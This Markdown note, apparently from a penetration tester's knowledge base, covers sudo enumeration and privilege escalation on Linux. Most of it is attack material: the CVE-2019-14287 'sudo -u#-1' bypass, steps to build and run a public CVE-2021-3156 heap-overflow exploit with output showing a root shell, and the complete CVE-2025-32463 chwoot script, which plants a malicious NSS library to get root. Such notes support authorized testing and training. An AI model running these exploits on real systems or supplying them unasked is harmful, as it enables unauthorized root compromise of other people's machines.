---
id: Sudo Enumeration
aliases: []
tags:
  - Linux/Privesc/Sudo-Enumeration
links: "[[Privesc]]"
---

# Sudo Enumeration

___

<!-- Commands {{{-->
## Commands

Enumerate commands the current user may run

<!-- Tip {{{-->
> [!tip]
>
> Exploit the found command(*s*)
>
> - [GTFOBins](https://gtfobins.github.io/#+sudo)
<!-- }}} -->

[sudo](https://man7.org/linux/man-pages/man8/sudo.8.html) —
Execute a command as another user

```sh
sudo -l
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> www-data@bashed:/home/arrexel# sudo -l
> ```
> ```sh
> Matching Defaults entries for www-data on bashed:
> env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
>
> User www-data may run the following commands on bashed:
> (scriptmanager : scriptmanager) NOPASSWD: ALL
> ```
>
> Run any command as `scriptmanager` via `sudo`, without a password
<!-- }}} -->

[sudo](https://man7.org/linux/man-pages/man8/sudo.8.html) —
Run command as specified user

```sh
sudo -u <user> /bin/echo Hello World!
```

```sh
sudo -u <user> bash
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo -u scriptmanager /bin/echo Hello World!
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Version {{{-->
## Version

Enumerate `sudo` version

```sh
sudo --version
```

```sh
sudo -V
```

```sh
sudo -V | head -n1
```

Enumerate if `sudo` version is in a vulnerable range

```sh
if sudo -V 2>/dev/null | grep -Eq 'Sudo ver 1\.[0-7]\.[0-9]+|1\.8\.1[0-9]|1\.8\.2[0-7]'; then
    echo ":: [+] :: Vulnerable sudo version found"
else
    echo ":: [-] :: Not vulnerable"
fi
```

[[SearchSploit]] — Search `sudo` version for public exploits

```sh
searchsploit sudo
```
___
<!-- }}} -->

<!-- Vulnerabilities {{{-->
## Vulnerabilities

<!-- CVE-2019-14287 {{{-->
### CVE-2019-14287

[CVE-2019-14287](https://nvd.nist.gov/vuln/detail/cve-2019-14287) —
In Sudo before `1.8.28`, an attacker
with access to a `Runas ALL` sudoer account
can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID

```sh
sudo -u#-1 /bin/bash
```

1. Enumerate which command(s) the user can run as `sudo`

```sh
sudo -l
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> cry0l1t3@nix02:~$ sudo -l
> ```
> ```sh
> [sudo] password for cry0l1t3: **********
>
> User cry0l1t3 may run the following commands on Penny:
>     ALL=(ALL) /usr/bin/id
> ```
<!-- }}} -->

2. Check [GTFOBins](https://gtfobins.github.io/#+sudo)
   and the command's man page for options

```sh
man -P cat <command>
```

3. Run the command as the part of the exploit

```sh
sudo -u#-1 /bin/ncdu
```

<!-- }}} -->

<!-- CVE-2021-3156 {{{-->
### CVE-2021-3156

[CVE-2021-3156](https://nvd.nist.gov/vuln/detail/cve-2021-3156) —
Sudo before `1.9.5p2` contains an off-by-one error
that can result in a heap-based buffer overflow,
which allows privilege escalation to root via `sudoedit -s`
and a command-line argument that ends with a single backslash character

Affected sudo versions:

- `1.8.31` - Ubuntu 20.04
- `1.8.27` - Debian 10
- `1.9.2` Fedora 33
- and others


1. Clone the repository (*[blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)*)

```sh
git clone https://github.com/blasty/CVE-2021-3156.git
```

2. Build the exploit

```sh
cd CVE-2021-3156
```

```sh
make
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> make
> ```
> ```sh
> rm -rf libnss_X
> mkdir libnss_X
> gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
> gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
> ```
<!-- }}} -->

3. Run the exploit to find out the target

```sh
./sudo-hax-me-a-sandwich
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich
> ```
>
> ```sh
> ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
>
>   usage: ./sudo-hax-me-a-sandwich <target>
>
>   available targets:
>   ------------------------------------------------------------
>     0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
>     1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
>     2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
>   ------------------------------------------------------------
>
>   manual mode:
>     ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
> ```
<!-- }}} -->


4. Find the version of the operating system

```sh
cat /etc/lsb-release
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> cry0l1t3@nix02:~$ cat /etc/lsb-release
> ```
>
> ```sh
> DISTRIB_ID=Ubuntu
> DISTRIB_RELEASE=20.04
> DISTRIB_CODENAME=focal
> DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
> ```
<!-- }}} -->

5. Run the exploit

```sh
./sudo-hax-me-a-sandwich 1
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1
> ```
>
> ```sh
> ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
>
> using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
> ** pray for your rootshell.. **
>
> # id
>
> uid=0(root) gid=0(root) groups=0(root)
> ```
<!-- }}} -->

<!-- }}} -->

<!-- CVE-2025-32463 {{{-->
### CVE-2025-32463

[CVE-2025-32463](https://nvd.nist.gov/vuln/detail/cve-2025-32463) —
Sudo versions before `1.9.17p1` (`1.9.14` - `1.9.17` < `1.9.17p1`)
allows unprivileged local users to escalate their privileges to root
via `sudo --chroot` option when `/etc/nsswitch.conf` file is used
from a user controlled directory

Validate vulnerability

```sh
sudo -R woot woot
```

<!-- Info {{{-->
> [!info]-
>
> Vulnerable sudo
>
> ```sh
> pwn ~ $ sudo -R woot woot
> sudo: woot: No such file or directory
> ```
>
> Patched sudo
>
> ```sh
> pwn ~ $ sudo -R woot woot
> [sudo] password for pwn:
> sudo: you are not permitted to use the -R option with woot
> ```
<!-- }}} -->

Proof‑of‑concept exploit that spawns a root shell inside the chroot

```sh
./sudo-chwoot.sh
```

<!-- Exploit {{{-->
> [!tip]- Exploit
>
> [GitHub - pr0v3rbs/CVE-2025-32463_chwoot](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/blob/main/sudo-chwoot.sh)
>
> ```sh
> #!/bin/bash
> # sudo-chwoot.sh
> # CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
> #                  @ Stratascale Cyber Research Unit (CRU)
> STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
> cd ${STAGE?} || exit 1
>
> if [ $# -eq 0 ]; then
>     # If no command is provided, default to an interactive root shell.
>     CMD="/bin/bash"
> else
>     # Otherwise, use the provided arguments as the command to execute.
>     CMD="$@"
> fi
>
> # Escape the command to safely include it in a C string literal.
> # This handles backslashes and double quotes.
> CMD_C_ESCAPED=$(printf '%s' "$CMD" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')
>
> cat > woot1337.c<<EOF
> #include <stdlib.h>
> #include <unistd.h>
>
> __attribute__((constructor)) void woot(void) {
>   setreuid(0,0);
>   setregid(0,0);
>   chdir("/");
>   execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
> }
> EOF
>
> mkdir -p woot/etc libnss_
> echo "passwd: /woot1337" > woot/etc/nsswitch.conf
> cp /etc/group woot/etc
> gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
>
> echo "woot!"
> sudo -R woot woot
> rm -rf ${STAGE?}
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
